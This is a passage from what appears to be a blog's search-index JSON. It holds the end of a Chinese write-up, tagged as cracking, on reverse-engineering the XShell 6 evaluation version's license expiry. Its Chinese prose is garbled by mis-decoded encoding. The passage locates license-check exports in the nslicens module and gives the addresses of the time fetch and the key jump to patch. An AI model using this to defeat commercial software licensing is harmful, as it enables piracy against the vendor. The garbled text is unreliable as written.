·ï¼Œå¯èƒ½è¿™ä¸ªGetLocalTimeä¼šè¢«æ‰§è¡Œå¾ˆå¤šæ¬¡ï¼Œæ‰€ä»¥éœ€è¦æ‰¾åˆ°åˆ›å»ºåˆ°æœŸçª—å£ä¹‹å‰çš„é‚£æ¬¡GetLocalTimeã€‚æˆ‘è¿™é‡Œåˆ†æçš„æ—¶å€™æ˜¯ç¬¬4æ¬¡æ‰§è¡ŒGetLocalTimeæ—¶åˆ°äº†å…³é”®ä½ç½®ï¼Œè¿™æ—¶çš„æ ˆå›æº¯æ˜¯è¿™æ ·çš„ï¼š è·å–æ—¶é—´å…³é”®ä½ç½®æ ˆå›æº¯\" è·å–æ—¶é—´å…³é”®ä½ç½®æ ˆå›æº¯ å¯ä»¥çœ‹åˆ°ODå¸®å¿™æ˜¾ç¤ºäº†ä¸€äº›å¾ˆå…³é”®çš„ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯nslicensè¿™ä¸ªæ¨¡å—ä¸­çš„å¯¼å‡ºå‡½æ•°åï¼Œè€Œè¿™å‡ ä¸ªå‡½æ•°åå¾ˆå¯ç–‘ï¼šCheckLicenseAndPackageã€CheckLicenseã€GetCurrentDateï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯è·å–å½“å‰æ—¶é—´å¹¶æ£€æŸ¥è®¸å¯è¯ ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œ10003E24è¿™ä¸ªä½ç½®è·å–äº†å½“å‰æ—¶é—´ï¼Œç„¶åå°±å¯ä»¥ä»è¿™ä¸ªä½ç½®å¼€å§‹ç€æ‰‹åˆ†æï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯å¯¹æ¯”çš„æ–¹æ³•åˆ†æçš„ï¼Œä¹Ÿå°±æ˜¯å…ˆæŠŠæ—¶é—´æ”¹æˆæœªåˆ°æœŸçš„æ—¶é—´ï¼Œè§‚å¯Ÿå…¶è·³è½¬ï¼Œç„¶åå†æŠŠæ—¶é—´æ”¹æˆåˆ°æœŸçš„æ—¶é—´ï¼Œå†è§‚å¯Ÿå…¶è·³è½¬ï¼Œå°±èƒ½å¾ˆå¿«æ‰¾åˆ°å…³é”®åˆ¤æ–­ä½ç½®ã€‚æˆ‘çš„æœ€ååˆ†æå¦‚ä¸‹ï¼š æœ€ååˆ†æ\" æœ€ååˆ†æ å¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªåˆ¤æ–­çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯10003F21çš„ä½ç½®ï¼Œå°±æ˜¯ä¸Šé¢é€šè¿‡æŸ¥æ‰¾çª—å£çš„æ–¹å¼æ‰¾åˆ°çš„å…³é”®è·³è½¬ä½ç½®ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„äº‹æƒ…å°±ä¸ç”¨å¤šè¯´äº† ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:4:3","tags":["é€†å‘","ç ´è§£"],"title":"XShell 6è¯„ä¼°ç‰ˆé€†å‘åˆ†æ","uri":"/2019/05/xshell-6-analysis/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"5. END è¿™æ¬¡åˆ†æç®—æ˜¯ç¬¬ä¸€ä¸ªç‹¬ç«‹åˆ†æç ´è§£çš„ç¨‹åºï¼Œä¸­é€”é‡åˆ°çš„å‘æ¯”è¿™å†™çš„å¤šäº†å»äº†ã€‚ä¾‹å¦‚ç¬¬ä¸€ä¸ªå¯¹è¯æ¡†APIçš„å‘ï¼Œæˆ‘è¿å¯¹è¯æ¡†çš„å›è°ƒå‡½æ•°éƒ½æ‰¾åˆ°äº†ï¼Œå°±æ˜¯æ‰¾ä¸åˆ°åœ¨å“ªåˆ›å»ºçš„å¯¹è¯æ¡†ï¼Œå¯¼è‡´æµªè´¹äº†å¾ˆé•¿çš„æ—¶é—´ã€‚è¿˜æœ‰åˆ†ææ—¶é—´çš„æ—¶å€™ï¼Œå› ä¸ºè°ƒç”¨äº†å¾ˆå¤šæ¬¡GetLocalTimeï¼Œæˆ‘å¼€å§‹æ²¡æœ‰æƒ³åˆ°åˆ†æåˆ›å»ºçª—å£ä¹‹å‰çš„é‚£ä¸ªGetLocalTimeï¼Œæ‰€ä»¥æˆ‘ä»ç¬¬ä¸€ä¸ªå¼€å§‹åˆ†æçš„ï¼Œç»“æœå‘ç°å‰é¢çš„æ ¹æœ¬æ²¡é¸Ÿç”¨ï¼Œæœ¬æ¥ä¸€ä¸¤ä¸ªå°æ—¶å°±èƒ½æå®Œçš„ä¸œè¥¿ï¼Œå¯¼è‡´æäº†ä¸€æ•´å¤©ï¼Œè¿™ä¹Ÿæ˜¯ç»éªŒå¤ªå°‘äº†ï¼Œè¿™æ¬¡è¿˜æ˜¯å¢é•¿äº†ä¸å°‘å¿«é€Ÿåˆ†æçš„ç»éªŒã€‚ æœ€åï¼š [1] è½¯ä»¶ç‰ˆæœ¬ï¼š è½¯ä»¶ç‰ˆæœ¬\" è½¯ä»¶ç‰ˆæœ¬ [2] ä¸‹è½½åœ°å€ï¼šhttps://www.netsarang.com/zh/all-downloads/ ","date":"2019-05-29","objectID":"/2019/05/xshell-6-analysis/:5:0","tags":["é€†å‘","ç ´è§£"],"title":"XShell 6è¯„ä¼°ç‰ˆé€†å‘åˆ†æ","uri":"/2019/05/xshell-6-analysis/"}]